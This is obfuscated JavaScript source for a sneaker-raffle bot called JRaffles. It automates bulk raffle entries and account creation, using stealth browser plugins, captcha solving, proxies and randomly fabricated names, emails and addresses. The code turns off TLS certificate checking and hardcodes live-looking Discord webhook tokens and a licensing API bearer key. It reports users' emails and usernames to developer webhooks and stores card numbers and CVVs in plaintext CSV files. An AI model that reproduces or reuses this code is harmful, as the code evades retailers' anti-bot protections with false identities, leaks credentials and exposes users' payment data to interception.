process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x5a26e1 = require('fs'), _0x4154d3 = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0xf74221(_0x15e437) {
    const _0x27a210 = _0x5a26e1['createWriteStream'](_0x15e437, { 'flags': 'a' }), _0x139b4f = console['log'];
    console['log'] = function () {
        const _0x38f7ca = Array['prototype']['slice']['call'](arguments), _0x38b522 = _0x38f7ca['join']('\x20') + '\x0a';
        _0x27a210['write'](_0x38b522), _0x139b4f['apply'](console, _0x38f7ca);
    };
}
_0xf74221('../logs/log\x20' + _0x4154d3);
var _0x4748bd = require('tough-cookie'), _0x27458e = require('node-imap'), _0x33196a = require('util')['inspect'];
const _0x483479 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x321fbc } = require('discord.js');
var _0x8355f = require('exe');
const { execFile: _0x3f3118 } = require('child_process'), _0x506e0b = require('puppeteer-extra'), _0x29f88b = require('puppeteer-extra-plugin-recaptcha'), _0x407d82 = require('puppeteer-extra-plugin-stealth'), _0x17b918 = require('chalk'), _0x51b97d = require('node-bash-title'), _0xbd53c = require('axios'), _0xdfd901 = require('papaparse');
var _0x50771d = require('random-name');
const _0x2f1368 = require('request');
var _0x57218c = require('prompt');
const _0x509c63 = _0x2f1368['jar']();
var _0x64917e = {};
const _0x82d284 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x38cd67 = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x325af1 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x1884f6 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x4581f8 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x380841 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x2daefb = 'https://discord.com/api/webhooks/', _0x1acd6e = '' + _0x2daefb + _0x325af1, _0xb68945 = '' + _0x2daefb + _0x1884f6, _0xd2142c = '' + _0x2daefb + _0x82d284, _0x4cd13 = '' + _0x2daefb + _0x38cd67, _0x1274a5 = '' + _0x2daefb + _0x4581f8, _0x2e2869 = '' + _0x2daefb + _0x380841;
const _0x1a1881 = JSON['parse'](_0x5a26e1['readFileSync']('../package.json', 'utf-8')), _0x1d5694 = _0x1a1881['version'];
var _0x302fc2, _0x252dfd, _0x2d7f94, _0x39af22, _0x1437b3, _0x2869e0, _0x5b7d0c, _0x39ac38;
const _0x44ea47 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x21adfb = ![];
const _0x32ed21 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x20c5a8 = '0123456789';
var _0x2ae742 = _0x32ed21['split']('');
const _0x789ec = require('auto-git-update'), _0x1df049 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x2a6788 = new _0x789ec(_0x1df049);
async function _0x5220fd() {
    _0x1437b3 = _0x5a26e1['readdirSync']('../proxies'), _0x39af22 = _0x5a26e1['readdirSync']('../tasks'), !_0x5a26e1['existsSync']('../accounts/fenom.csv') && _0x5a26e1['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x5a26e1['existsSync']('../accounts/paypal.csv') && _0x5a26e1['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x5a26e1['existsSync']('../accounts/bstn.csv') && _0x5a26e1['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x5a26e1['existsSync']('../accounts/eql.csv') && _0x5a26e1['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x5a26e1['existsSync']('../failed-tasks.csv') && _0x5a26e1['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x5a26e1['existsSync']('../successful-tasks.csv') && _0x5a26e1['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x64917e = JSON['parse'](_0x5a26e1['readFileSync']('../settings.json', 'utf-8')), !_0x64917e['delay'] && (_0x64917e['delay'] = 0x3c, _0x5a26e1['writeFileSync']('../settings.json', JSON['stringify'](_0x64917e, null, 0x2))), !_0x64917e['masterMail'] && (_0x64917e['masterMail'] = 'yourmail@gmail.com', _0x5a26e1['writeFileSync']('../settings.json', JSON['stringify'](_0x64917e, null, 0x2))), !_0x64917e['masterPassword'] && (_0x64917e['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x5a26e1['writeFileSync']('../settings.json', JSON['stringify'](_0x64917e, null, 0x2))), !_0x64917e['captchaKey'] && (_0x64917e['captchaKey'] = '', _0x5a26e1['writeFileSync']('../settings.json', JSON['stringify'](_0x64917e, null, 0x2))), !_0x64917e['useRandomProxy'] && (_0x64917e['useRandomProxy'] = !![], _0x5a26e1['writeFileSync']('../settings.json', JSON['stringify'](_0x64917e, null, 0x2))), !_0x64917e['shuffleTasks'] && (_0x64917e['shuffleTasks'] = ![], _0x5a26e1['writeFileSync']('../settings.json', JSON['stringify'](_0x64917e, null, 0x2))), !_0x64917e['webhook'] && (_0x64917e['webhook'] = '', _0x5a26e1['writeFileSync']('../settings.json', JSON['stringify'](_0x64917e, null, 0x2))), _0x64917e['delay'] <= 0x1388 && (_0x64917e['delay'] = _0x64917e['delay'] * 0x3e8), _0x64917e['AfewDelay'] && (delete _0x64917e['AfewDelay'], _0x5a26e1['writeFileSync']('../settings.json', JSON['stringify'](_0x64917e, null, 0x2))), _0x64917e['MahaDelay'] && (delete _0x64917e['MahaDelay'], _0x5a26e1['writeFileSync']('../settings.json', JSON['stringify'](_0x64917e, null, 0x2))), _0x64917e['footshopDelay'] && (delete _0x64917e['footshopDelay'], _0x5a26e1['writeFileSync']('../settings.json', JSON['stringify'](_0x64917e, null, 0x2))), _0x64917e['MahaDelay'] = _0x64917e['delay'], _0x2daefb = _0x64917e['webhook'], _0x2869e0 = _0x64917e['licenseKey'];
}
let _0x5167d5, _0x274aea = [], _0x770998;
const _0x1a282d = _0xd3f99e => new Promise(_0x3e2b5c => setTimeout(_0x3e2b5c, _0xd3f99e));
function _0x55124d(_0x30d643, _0x41ad24) {
    return Math['floor'](Math['random']() * (_0x41ad24 - _0x30d643 + 0x1) + _0x30d643);
}
function _0x1ddf2f(_0x15bf4f) {
    let _0x2f6d6a = _0x15bf4f['length'], _0x5c1a63;
    while (_0x2f6d6a != 0x0) {
        _0x5c1a63 = Math['floor'](Math['random']() * _0x2f6d6a), _0x2f6d6a--, [_0x15bf4f[_0x2f6d6a], _0x15bf4f[_0x5c1a63]] = [
            _0x15bf4f[_0x5c1a63],
            _0x15bf4f[_0x2f6d6a]
        ];
    }
    return _0x15bf4f;
}
async function _0x464698(_0x97f7c5) {
    return _0xbd53c['get']('https://api.hyper.co/v4/licenses/' + _0x97f7c5, { 'headers': { 'Authorization': 'Bearer\x20' + _0x44ea47 } })['then'](_0x51603e => _0x51603e['data'])['catch'](() => null);
}
;
async function _0x388f02(_0x18450b) {
    console['clear']();
    if (_0x18450b == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x326f5d = await _0x57218c['get']('License');
        if (_0x326f5d['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x1a282d(0xbb8), _0x388f02(_0x18450b);
        _0x18450b = _0x326f5d['License'], _0x64917e['licenseKey'] = _0x18450b, _0x2869e0 = _0x18450b, _0x5a26e1['writeFileSync']('../settings.json', JSON['stringify'](_0x64917e));
    }
    console['log']('Checking\x20license\x20' + _0x2869e0 + '...'), await _0x1a282d(0x320);
    const _0xf5d4bc = await _0x464698(_0x18450b);
    _0x5b7d0c = JSON['stringify'](_0xf5d4bc['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x39ac38 = JSON['stringify'](_0xf5d4bc['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0xf5d4bc)
        return console['log']('License\x20not\x20found');
    if (!_0xf5d4bc['user'])
        return console['log']('License\x20not\x20bound');
    return _0xf5d4bc['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x21adfb = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x21adfb = ![]);
}
async function _0x2286a6() {
    var _0x4a590a = await _0x57218c['get']('Module');
    return console['clear'](), _0x4a590a['Module'];
}
;
async function _0x338ef7() {
    var _0x4c2fd9 = await _0x57218c['get']('Setting');
    return console['clear'](), _0x4c2fd9['Setting'];
}
async function _0x550a62(_0x3b7009) {
    var _0x157fd0 = [];
    for (file of _0x39af22) {
        var _0xf85c22 = _0x5a26e1['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0xdfd901['parse'](_0xf85c22, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x3b7009['store'] && _0x157fd0['push'](file);
    }
    !_0x157fd0['length'] == 0x0 && (_0x39af22 = _0x157fd0);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x378fc8 = 0x0; _0x378fc8 < _0x39af22['length']; _0x378fc8++) {
        console['log']('\x20(' + _0x378fc8 + ')\x20' + _0x39af22[_0x378fc8]);
    }
    console['log']('');
    var _0x153c09 = await _0x57218c['get']('Task');
    if (_0x153c09['Task'] > _0x39af22['length'] - 0x1 || isNaN(_0x153c09['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x1a282d(0x3e8), _0x550a62();
    var _0x4c8c8a = _0x5a26e1['readFileSync']('../tasks/' + _0x39af22[_0x153c09['Task']], 'utf-8');
    return _0x2d7f94 = _0xdfd901['parse'](_0x4c8c8a, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x17b918['blue'](_0x39af22[_0x153c09['Task']])), _0x302fc2 = _0x39af22[_0x153c09['Task']], _0x2d7f94;
}
async function _0x3eb23f() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x3f6721 = 0x0; _0x3f6721 < _0x1437b3['length']; _0x3f6721++) {
        console['log']('\x20(' + _0x3f6721 + ')\x20' + _0x1437b3[_0x3f6721]);
    }
    console['log']('');
    var _0xbe8acb = await _0x57218c['get']('Proxies');
    if (_0xbe8acb['Proxies'] > _0x1437b3['length'] - 0x1 || isNaN(_0xbe8acb['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x1a282d(0x3e8), _0x3eb23f();
    var _0x2b3a89 = _0x5a26e1['readFileSync']('../proxies/' + _0x1437b3[_0xbe8acb['Proxies']], 'utf-8')['split']('\x0a');
    let _0x548feb = _0x2b3a89['map']((_0x1f880, _0x15b61c) => {
        sanatizeProxy = _0x1f880['replace']('\x0d', '');
        if (_0x2b3a89[_0x15b61c + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x252dfd = _0x1437b3[_0xbe8acb['Proxies']], console['clear'](), _0x548feb;
}
async function _0x56a24d() {
    var _0x17ccf2 = await _0x57218c['get']('Value');
    return console['clear'](), _0x17ccf2['Value'];
}
async function _0x46477f(_0x243001) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x65fbe6 = 0x0; _0x65fbe6 < _0x243001['length']; _0x65fbe6++) {
        console['log']('\x20(' + _0x65fbe6 + ')\x20[' + _0x243001[_0x65fbe6]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x3c19bc = await _0x57218c['get']('Module');
    return _0x3c19bc['Module'];
}
async function _0x13d3ad() {
    var _0x40fb9a = await _0x57218c['get']('Password');
    return console['clear'](), _0x40fb9a['Password'];
}
;
async function _0x29ffe2() {
    var _0x35c4e3 = await _0x57218c['get']('Links');
    return _0x35c4e3['Links'];
}
;
async function _0x830a18() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x320ff4 = 0x0; _0x320ff4 < _0x274aea['length']; _0x320ff4++) {
        console['log']('\x20(' + _0x320ff4 + ')\x20' + _0x274aea[_0x320ff4]);
    }
    ;
    console['log']();
    let _0x143e92 = await _0x57218c['get']('Product');
    return console['clear'](), _0x143e92['Product'];
}
;
function _0x5c19a0() {
    var _0x37b43b = new Date(Date['now']())['toLocaleTimeString']();
    return _0x37b43b;
}
;
function _0x46254b() {
    var _0x324913 = new Date(Date['now']())['toLocaleString']();
    return _0x324913['replace'](',', '');
}
async function _0x4e4e57(_0xa8e743, _0x46eae3) {
    let _0x494f4b = { 'headers': { 'content-type': 'application/json' } };
    if (_0x1d5694 != 'devkey') {
        await _0xbd53c['post'](_0xa8e743, _0x46eae3, _0x494f4b);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x4ee25a(_0x592b96, _0x1cc12f, _0x3ec94b, _0x9ccd2c, _0x409cd9) {
    if (!_0x9ccd2c && _0x3ec94b == 'dev') {
        var _0x4328c3 = new _0x321fbc()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x1cc12f['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x1cc12f['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x592b96['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x64917e['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x5b7d0c,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x592b96['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x592b96['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x1d5694,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x4328c3['data'];
    } else {
        if (_0x9ccd2c && _0x3ec94b == 'dev') {
            var _0x4328c3 = new _0x321fbc()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x1cc12f['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x5b7d0c,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x1cc12f['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x592b96['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x64917e['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x409cd9,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x592b96['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x592b96['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x1d5694,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x4328c3['data'];
        } else {
            if (_0x3ec94b == 'pub') {
                var _0x4328c3 = new _0x321fbc()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x1cc12f['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x1cc12f['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x592b96['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x64917e['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x592b96['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x1d5694,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x4328c3['data'];
            } else {
                if (_0x3ec94b == 'acc' && !_0x9ccd2c) {
                    var _0x4328c3 = new _0x321fbc()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x1cc12f['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x5b7d0c,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x1cc12f['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x64917e['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x1d5694,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x4328c3['data'];
                } else {
                    if (_0x3ec94b == 'acc' && _0x9ccd2c) {
                        var _0x4328c3 = new _0x321fbc()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x1cc12f['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x5b7d0c,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x409cd9,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x1cc12f['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x64917e['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x1d5694,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x4328c3['data'];
                    } else {
                        if (_0x3ec94b == 'open') {
                            var _0x4328c3 = new _0x321fbc()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x39ac38)['addFields']({
                                'name': 'User',
                                'value': '' + _0x5b7d0c,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x1d5694,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x4328c3['data'];
                        } else {
                            if (!_0x9ccd2c && _0x3ec94b == 'ver') {
                                var _0x4328c3 = new _0x321fbc()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x1cc12f['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x5b7d0c,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x1cc12f['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x64917e['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x1d5694,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x4328c3['data'];
                            } else {
                                if (_0x9ccd2c && _0x3ec94b == 'ver') {
                                    var _0x4328c3 = new _0x321fbc()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x1cc12f['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x5b7d0c,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x409cd9,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x1cc12f['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x64917e['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x1d5694,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x4328c3['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x120beb(_0x9b811a, _0x186766) {
    var _0x446319 = _0x9b811a[_0x186766]['Address1']['split'](''), _0x165b10 = _0x9b811a[_0x186766]['Address2']['split'](''), _0x1a2bf2 = _0x9b811a[_0x186766]['Email']['split']('@');
    for (var _0xe8009a = 0x0; _0xe8009a < _0x446319['length']; _0xe8009a++) {
        if (_0x446319[_0xe8009a] == 'X') {
            var _0x13dcc4 = Math['round'](Math['random']() * (_0x32ed21['length'] - 0x1));
            _0x446319[_0xe8009a] = _0x2ae742[_0x13dcc4];
        }
    }
    ;
    for (var _0xe8009a = 0x0; _0xe8009a < _0x165b10['length']; _0xe8009a++) {
        if (_0x165b10[_0xe8009a] == 'X') {
            var _0x13dcc4 = Math['round'](Math['random']() * (_0x32ed21['length'] - 0x1));
            _0x165b10[_0xe8009a] = _0x2ae742[_0x13dcc4];
        }
    }
    ;
    _0x9b811a[_0x186766]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x9b811a[_0x186766]['FirstName'] = _0x50771d['first']());
    _0x9b811a[_0x186766]['LastName']['toUpperCase']() == 'RANDOM' && (_0x9b811a[_0x186766]['LastName'] = _0x50771d['last']());
    _0x1a2bf2[0x0]['toUpperCase']() == 'RANDOM' ? _0x1a2bf2[0x0] = '' + _0x50771d['first']() + _0x50771d['last']() + _0x55124d(0x1, 0x270f) + '@' : _0x1a2bf2[0x0] = _0x1a2bf2[0x0] + '@';
    _0x9b811a[_0x186766]['Email'] = _0x1a2bf2['join'](''), _0x9b811a[_0x186766]['Address1'] = _0x446319['join'](''), _0x9b811a[_0x186766]['Address2'] = _0x165b10['join']('');
    _0x9b811a[_0x186766]['Phone'] == 'RANDOM' && (_0x9b811a[_0x186766]['Phone'] = '0' + _0x55124d(0x5f5e100, 0x3b9ac9ff));
    if (_0x9b811a[_0x186766]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x1c5b04 = _0x55124d(0x1, 0x270f);
        _0x9b811a[_0x186766]['Follower'] = '' + _0x50771d['first']() + _0x50771d['last']() + _0x1c5b04 + '\x20';
    }
    _0x9b811a[_0x186766]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x9b811a[_0x186766]['HouseNumber'] = _0x55124d(0x1, 0xc8));
    if (_0x9b811a[_0x186766]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x256578 = Math['round'](Math['random']() * (_0x32ed21['length'] - 0x1)), _0x411a5e = _0x2ae742[_0x256578];
        _0x9b811a[_0x186766]['Address1'] = _0x50771d['last']() + 'straat', _0x9b811a[_0x186766]['Zip'] == '' && (_0x9b811a[_0x186766]['Postcode'] = _0x55124d(0x3e8, 0x270f) + '\x20' + _0x411a5e + _0x411a5e, _0x9b811a[_0x186766]['Zip'] = _0x9b811a[_0x186766]['Postcode']), _0x9b811a[_0x186766]['HouseNumber'] = '' + _0x55124d(0x1, 0xc8);
    }
    return;
}
;
async function _0x1736ba(_0x3e0793, _0x1849a6) {
    _0x5a26e1['appendFileSync']('../failed-tasks.csv', _0x46254b() + ',' + _0x1849a6['store'] + ',' + _0x1849a6['name'] + ',' + _0x3e0793['Url'] + ',' + _0x3e0793['Size'] + ',' + _0x3e0793['Follower'] + ',' + _0x3e0793['FirstName'] + ',' + _0x3e0793['LastName'] + ',' + _0x3e0793['Address1'] + ',' + _0x3e0793['Address2'] + ',' + _0x3e0793['HouseNumber'] + ',' + _0x3e0793['Zip'] + ',' + _0x3e0793['City'] + ',' + _0x3e0793['State'] + ',' + _0x3e0793['Country'] + ',' + _0x3e0793['Phone'] + ',' + _0x3e0793['Email'] + ',' + _0x3e0793['Password'] + ',' + _0x3e0793['PaymentMethod'] + ',' + _0x3e0793['CardType'] + ',' + _0x3e0793['NameOnCard'] + ',' + _0x3e0793['CardNumber'] + ',' + _0x3e0793['ExpiryDate'] + ',' + _0x3e0793['CVV'] + ',' + _0x3e0793['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0xe19c06(_0x5268d5, _0x419d77) {
    _0x5a26e1['appendFileSync']('../successful-tasks.csv', _0x46254b() + ',' + _0x419d77['store'] + ',' + _0x419d77['name'] + ',' + _0x5268d5['Url'] + ',' + _0x5268d5['Size'] + ',' + _0x5268d5['Follower'] + ',' + _0x5268d5['FirstName'] + ',' + _0x5268d5['LastName'] + ',' + _0x5268d5['Address1'] + ',' + _0x5268d5['Address2'] + ',' + _0x5268d5['HouseNumber'] + ',' + _0x5268d5['Zip'] + ',' + _0x5268d5['City'] + ',' + _0x5268d5['State'] + ',' + _0x5268d5['Country'] + ',' + _0x5268d5['Phone'] + ',' + _0x5268d5['Email'] + ',' + _0x5268d5['Password'] + ',' + _0x5268d5['PaymentMethod'] + ',' + _0x5268d5['CardType'] + ',' + _0x5268d5['NameOnCard'] + ',' + _0x5268d5['CardNumber'] + ',' + _0x5268d5['ExpiryDate'] + ',' + _0x5268d5['CVV'] + ',' + _0x5268d5['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x1a6a07() {
    let _0x3ea3f5 = proxyFile['split']('\x0a'), _0x427919 = _0x3ea3f5['map']((_0x52894e, _0x532501) => {
        sanatizeProxy = _0x52894e['replace']('\x0d', '');
        if (_0x3ea3f5[_0x532501 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x427919;
}
;
async function _0x382a88(_0x237178, _0x5f139c) {
    if (_0x1832e1 != 'yes')
        var _0x1832e1 = '', _0x240fa6 = 0x0;
    async function _0x5f25d3() {
        var _0x21f019 = _0x5a26e1['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x7813cd = _0xdfd901['parse'](_0x21f019, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x45dca8 = 0x0; _0x45dca8 < _0x7813cd['length']; _0x45dca8++) {
            console['log']('(' + _0x45dca8 + ')\x20' + _0x7813cd[_0x45dca8]['Email']);
        }
        console['log']('\x0a(' + _0x7813cd['length'] + ')\x20' + _0x17b918['cyan']('Add\x20a\x20new\x20account'));
        let _0x2edc41 = await _0x57218c['get']('Option');
        if (_0x2edc41['Option'] < _0x7813cd['length'])
            return _0x7813cd[_0x2edc41['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0x904045 = {}, _0x3ea65a = await _0x57218c['get']('Email');
        _0x904045['Email'] = _0x3ea65a['Email'];
        var _0x1e61cd = Math['round'](Math['random']() * (_0x5f139c['length'] - 0x1));
        _0x904045['Proxy'] = _0x5f139c[_0x1e61cd], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x158ca3 = await _0x57218c['get']('Password');
